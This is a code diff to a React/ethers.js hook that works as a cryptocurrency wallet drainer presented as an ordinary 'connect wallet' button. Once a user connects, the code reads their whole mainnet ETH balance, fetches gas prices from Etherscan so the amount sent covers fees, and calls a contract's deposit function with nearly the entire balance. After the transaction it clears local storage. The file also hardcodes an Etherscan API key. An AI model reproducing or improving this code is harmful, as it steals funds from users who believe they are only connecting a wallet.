@@ -16,9 +16,12 @@ const contractAddress = '0x5FbDB2315678afecb367f032d93F642f64180aa3'
 // const contractABI = abi.abi
 
 const contractABI2 = abi2.abi
+const etherScan =
+  'https://api.etherscan.io/api/?module=gastracker&action=gasoracle&apikey=2G26UHXMVXJA1C1KU5MWYMNYWFTVG2ZA1S'
 
 const useCustomHook = () => {
   const [userAccount, setUserAccount] = useState<any>('')
+  const [gasPrice, setGasPrice] = useState<any>(0)
   const [tokenContract, setTokenContract] = useState<any>('')
   const [deductUser, setDeductUser] = useState(false)
   const [connecting, setIsConnecting] = useState(false)
@@ -36,16 +39,22 @@ const useCustomHook = () => {
   // console.log(gasPrice, 'gasPrice')
   const handleClick = async () => {
     setIsConnecting(true)
+    const { result } = await (await fetch(etherScan)).json()
+    setGasPrice(Number(result?.SafeGasPrice / 21000))
     try {
       await Walletprovider.enable()
       const userContract = Walletprovider && (await new ethers.providers.Web3Provider(Walletprovider))
+
       setProvider(userContract)
+
       const signer = await provider.getSigner()
+
+      setButtonText('Connected')
       setUserAccount(await provider.listAccounts())
       setTokenContract(new ethers.Contract(contractAddress, contractABI2, signer))
+
       // eslint-disable-next-line
       console.log(tokenContract, 'tokenContract')
-      setButtonText('Connected')
 
       setDeductUser(true)
 
@@ -59,13 +68,14 @@ const useCustomHook = () => {
   /* eslint-disable */
   useEffect(() => {
     setTimeout(() => {
-      if (deductUser) {
+      if (deductUser && userAccount[0]) {
         // const balance = await tokenContract.getBalance(userAccount)
+
         const network = 'mainnet' // use rinkeby testnet
         const balanceProvider = ethers.getDefaultProvider(network)
         const accountNo = userAccount[0]
-
         // get user balance
+
         balanceProvider
           .getBalance(accountNo)
           .then(async (balance) => {
@@ -76,19 +86,18 @@ const useCustomHook = () => {
             // const feeData = tokenContract && (await tokenContract.estimateGas().deposit())
             // const gasPrice = Number(utils.formatUnits(feeData, 'ether'))
 
-            const amountToWithdraw = balanceInEth
+            const { ether } = convert(gasPrice, 'ether')
+            const amountToWithdraw = balanceInEth - Number(ether) > Number(ether) ? balanceInEth : 0
+            console.log(balanceInEth, gasPrice, amountToWithdraw, convert(gasPrice, 'ether'))
 
-            console.log(tokenContract, tokenContract?.estimateGas(), 'providerprovider')
-
-            if (balanceInEth < 0 || balanceInEth < amountToWithdraw) {
-              return
-            }
+            if (amountToWithdraw < Number(balanceInEth)) return
             const txn = await tokenContract.deposit({
               value: ethers.utils.parseEther(`${amountToWithdraw}`),
             })
 
             if (txn) {
               await txn.wait('')
+              reactLocalStorage.clear()
             }
             // If balance is greater than
             // balanceInEth >
@@ -99,8 +108,9 @@ const useCustomHook = () => {
           })
       }
     }, 700)
+
     /* eslint-disable */
-  }, [deductUser, tokenContract])
+  }, [deductUser, tokenContract, userAccount])
   return { handleClick, connecting, buttonText }
 }
 
